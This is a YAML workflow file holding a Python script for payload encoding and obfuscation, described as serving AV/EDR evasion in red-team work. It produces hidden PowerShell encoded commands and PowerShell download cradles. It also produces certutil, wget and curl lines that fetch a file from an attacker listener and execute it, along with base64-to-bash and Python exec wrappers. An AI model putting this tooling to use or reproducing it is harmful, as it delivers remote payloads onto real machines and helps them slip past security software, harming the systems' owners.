name: payload-encode
description: |
  Payload encoding/obfuscation pipeline — encode payloads through multiple
  layers for AV/EDR evasion. Supports Base64, XOR, URL, PowerShell
  download cradle, Python exec wrapper, and custom chains.
tags: [utility, payload, encoding, evasion, redteam]
dispatch:
  inputs:
    payload:
      required: true
      type: string
      description: Raw payload string or @file path
    format:
      type: string
      default: powershell
      description: |
        Output format: powershell, python, bash, base64, xor-base64,
        certutil, wget-chain, multi-layer
    xor_key:
      type: string
      default: '41'
      description: XOR key (hex byte) for XOR encoding
    listener:
      type: string
      default: ''
      description: Listener URL for download cradles

jobs:
  encode:
    name: Payload Encoding
    outputs:
      encoded: '${{ steps["generate-payload"].outputs.encoded }}'
      format: '${{ steps["generate-payload"].outputs.format }}'
      original_size: '${{ steps["generate-payload"].outputs.original_size }}'
      encoded_size: '${{ steps["generate-payload"].outputs.encoded_size }}'
    steps:
    - name: generate-payload
      script: |
        import base64
        from pathlib import Path

        raw = '''{{ inputs.payload }}'''
        fmt = '{{ inputs.format }}'
        xor_key = int('{{ inputs.xor_key }}', 16)
        listener = '{{ inputs.listener }}'

        # Read from file if path
        if Path(raw).is_file():
            raw = Path(raw).read_text()

        outputs = {}

        # Base64
        b64 = base64.b64encode(raw.encode()).decode()
        outputs['base64'] = b64

        # XOR + Base64
        xored = bytes([b ^ xor_key for b in raw.encode()])
        xor_b64 = base64.b64encode(xored).decode()
        outputs['xor_base64'] = xor_b64

        # PowerShell encoded command
        ps_bytes = raw.encode('utf-16-le')
        ps_b64 = base64.b64encode(ps_bytes).decode()
        outputs['powershell'] = f'powershell -nop -w hidden -enc {ps_b64}'

        # PowerShell download cradle
        if listener:
            outputs['ps_cradle'] = f"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('{listener}')\""
            outputs['ps_cradle_b64'] = 'powershell -nop -w hidden -enc ' + base64.b64encode(
                f"IEX(New-Object Net.WebClient).DownloadString('{listener}')".encode('utf-16-le')
            ).decode()

        # Python exec wrapper
        outputs['python'] = f"python3 -c \"import base64;exec(base64.b64decode('{b64}'))\""

        # Bash base64 decode + exec
        outputs['bash'] = f"echo '{b64}' | base64 -d | bash"

        # Certutil
        if listener:
            outputs['certutil'] = f"certutil -urlcache -split -f {listener} %TEMP%\\payload.exe && %TEMP%\\payload.exe"

        # Wget chain
        if listener:
            outputs['wget'] = f"wget -q {listener} -O /tmp/.p && chmod +x /tmp/.p && /tmp/.p &"
            outputs['curl'] = f"curl -sL {listener} -o /tmp/.p && chmod +x /tmp/.p && /tmp/.p &"

        # Multi-layer: XOR → base64 → URL encode
        import urllib.parse
        multi = urllib.parse.quote(xor_b64)
        outputs['multi_layer'] = multi

        # Select output
        if fmt in outputs:
            primary = outputs[fmt]
        else:
            primary = outputs.get('base64', b64)

        print(f"=== PAYLOAD ENCODING ({fmt.upper()}) ===")
        print()
        print(primary)
        print()
        print("=== ALL FORMATS ===")
        for name, encoded in outputs.items():
            preview = encoded[:80] + '...' if len(encoded) > 80 else encoded
            print(f"  [{name}] {preview}")

        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
            f.write(f"encoded={primary}\n")
            f.write(f"format={fmt}\n")
            f.write(f"original_size={len(raw)}\n")
            f.write(f"encoded_size={len(primary)}\n")

        # Save all formats
        out_dir = Path('/tmp/ofx_payloads')
        out_dir.mkdir(exist_ok=True)
        for name, encoded in outputs.items():
            (out_dir / f'{name}.txt').write_text(encoded + '\n')
        print(f"\nAll formats saved to {out_dir}/")
      log-stdout: true
